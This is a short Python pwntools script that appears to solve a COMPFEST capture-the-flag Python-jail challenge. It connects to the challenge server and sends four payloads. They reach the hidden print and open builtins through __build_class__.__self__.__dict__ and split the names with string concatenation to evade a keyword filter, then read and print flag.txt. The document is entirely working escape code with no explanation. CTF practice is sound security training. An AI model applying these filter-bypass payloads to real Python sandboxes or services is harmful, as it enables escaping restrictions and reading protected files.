from pwn import remote

r = remote('challenges.ctf.compfest.id', 20013)

payload_1 = b"p = __build_class__.__self__.__dict__['pri''nt']"
payload_2 = b"f = __build_class__.__self__.__dict__['op''en']('fla''g.txt')"
payload_3 = b"r = f.__getattribute__('re''ad')"
payload_4 = b"p(r())"

r.sendlineafter(b'>>> ', payload_1)
r.sendlineafter(b'>>> ', payload_2)
r.sendlineafter(b'>>> ', payload_3)
r.sendlineafter(b'>>> ', payload_4)

flag = r.recvline().strip().decode()
r.close()

print(flag)